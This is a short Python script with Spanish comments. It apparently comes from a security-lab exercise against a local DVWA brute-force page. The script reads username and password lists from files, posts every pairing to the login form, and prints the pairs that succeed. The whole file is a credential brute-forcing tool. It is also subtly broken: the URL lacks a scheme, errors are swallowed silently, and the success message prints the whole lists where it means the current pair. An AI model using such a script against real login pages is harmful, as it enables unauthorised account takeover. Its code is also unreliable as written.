import requests

#funcion para importar nombres y contraseñas
def read_file(nombre_archivo):
    with open(nombre_archivo, 'r') as archivo:
        return [linea.strip() for linea in archivo]

#Primero importamos la url de la página web
#Es un localhost asi que nos conectamos al mismo
url = 'localhost:8081/vulnerabilities/brute/'

#users.txt
usuario = read_file('users.txt')
#passwords.txt
contrasena = read_file ('passwords.txt')

def try_login(url, usuario, contrasena):
    datos = {
        'user': usuario,
        'password': contrasena
    }
    try:
        respuesta = requests.post(url, data=datos)
        return respuesta.status_code == 200 and "Login exitoso" in respuesta.text
    except requests.RequestException:
        return False

#counter de combinaciones exitosas
combinaciones_exitosas = []

#logica del inicio de sesion
for i in usuario:
    for j in contrasena:
        if try_login(url, i, j):
            combinaciones_exitosas.append((i,j))
            print(f"Éxito: Usuario '{usuario}' con contraseña '{contrasena}'")

print(f"Combinaciones exitosas encontradas: {len(combinaciones_exitosas)}")
for usuario, contrasena in combinaciones_exitosas:
    print(f"- Usuario: {usuario}, Contraseña: {contrasena}")
